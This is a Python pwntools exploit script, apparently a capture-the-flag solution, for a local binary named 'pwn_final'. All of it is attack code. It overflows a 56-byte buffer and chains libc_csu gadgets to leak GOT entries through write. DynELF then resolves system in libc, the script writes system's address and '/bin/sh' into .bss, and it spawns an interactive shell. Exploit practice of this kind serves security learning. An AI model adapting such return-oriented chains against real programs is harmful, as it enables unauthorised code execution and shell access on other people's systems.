from pwn import *
 
elf = ELF('./pwn_final')
 
got_write = elf.got['write']
print 'got_write= ' + hex(got_write)
call_get_name_func = 0x400966
print 'call_get_name_func= ' + hex(call_get_name_func)
got_read = elf.got['read']
print "got_read: " + hex(got_read)
 
bss_addr = 0x6020c0
 
pad = 'a'
 
p = process('./pwn_final')
#gdb.attach(p)
 
#get system address
def leak(address):
    p.recvuntil('please enter your name:')
    payload1 = pad * 56
    payload1 += p64(0x400d9a)+ p64(0) + p64(1) + p64(got_write) + p64(128) + p64(address) + p64(1) + p64(0x400d80)
    payload1 += "\x00"*56
    payload1 += p64(call_get_name_func)
    p.sendline(payload1)
    data = p.recv(128)
    print "%#x => %s" % (address, (data or '').encode('hex'))
    return data
 
d = DynELF(leak, elf=ELF('./pwn_final'))
 
system_addr = d.lookup('system', 'libc')
print "system_addr=" + hex(system_addr)
 
#write system && /bin/sh
payload2 = "a"*56
payload2 += p64(0x400d96)+ p64(0) +p64(0) + p64(1) + p64(got_read) + p64(16) + p64(bss_addr) + p64(0) + p64(0x400d80)
payload2 += "\x00"*56
payload2 += p64(call_get_name_func)
p.sendline(payload2)
 
  
p.send(p64(system_addr))
p.send("/bin/sh\0")
 
 
p.recvuntil('name:')
 
# call system
payload3 = "a"*56
payload3 += p64(0x400d96)+ p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(0) + p64(0) + p64(bss_addr+8) + p64(0x400d80)
payload3 += "\x00"*56
payload3 += p64(call_get_name_func)
p.sendline(payload3)
 
 
p.interactive()
